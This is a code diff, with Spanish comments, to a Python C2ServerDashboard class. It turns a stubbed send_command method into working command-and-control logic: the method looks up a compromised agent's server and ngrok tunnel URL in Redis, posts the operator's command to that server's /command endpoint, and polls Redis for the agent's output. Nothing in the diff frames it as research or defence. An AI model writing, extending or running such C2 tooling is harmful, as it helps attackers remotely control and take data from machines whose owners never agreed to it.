@@ -121,13 +121,59 @@ class C2ServerDashboard:
         return len([a for a in self.get_agents() if a.get('status') == 'online'])
    
     def send_command(self, agent_id, command):
-        self.command_history.insert(0, {
-            "agent": agent_id,
-            "cmd": command,
-            "output": f"[+] Output from {command}",
-            "timestamp": datetime.now()
-        })
-        return f"[+] $ {command}\n[+] Execution successful on {agent_id}"
+        """Envía comando real al servidor C2 y espera respuesta."""
+        # Obtener la URL del servidor al que está conectado el agente
+        if not redis_client:
+            return "[!] Redis no disponible"
+        
+        try:
+            server_name = redis_client.get(f"agent:{agent_id}:server")
+            if not server_name:
+                return f"[!] No se encontró el servidor del agente {agent_id}"
+            
+            server_url = redis_client.get(f"server:{server_name}:ngrok_url")
+            if not server_url:
+                return f"[!] No se encontró la URL del servidor {server_name}"
+            
+            # Generar ID único para el comando
+            import uuid
+            msg_id = str(uuid.uuid4())[:8]
+            
+            # Enviar comando al servidor C2 via HTTP
+            import requests as req
+            response = req.post(
+                f"{server_url}/command",
+                json={
+                    "agent_id": agent_id,
+                    "command": command,
+                    "id": msg_id
+                },
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                # Guardar en historial
+                self.command_history.insert(0, {
+                    "agent": agent_id,
+                    "cmd": command,
+                    "output": f"[enviado] Esperando respuesta...",
+                    "timestamp": datetime.now()
+                })
+                # Esperar respuesta en Redis (el servidor la guardará ahí)
+                import time
+                for _ in range(15):  # Esperar hasta 15 segundos
+                    time.sleep(1)
+                    result = redis_client.get(f"result:{msg_id}")
+                    if result:
+                        redis_client.delete(f"result:{msg_id}")
+                        self.command_history[0]["output"] = result
+                        return result
+                return f"[timeout] No se recibió respuesta en 15 segundos"
+            else:
+                return f"[!] Error del servidor: {response.status_code}"
+        
+        except Exception as e:
+            return f"[!] Error enviando comando: {e}"
    
     def run_plugin(self, agent_id, plugin):
         return f"[+] Plugin '{plugin}' deployed on {agent_id}\n[+] Status: Running"
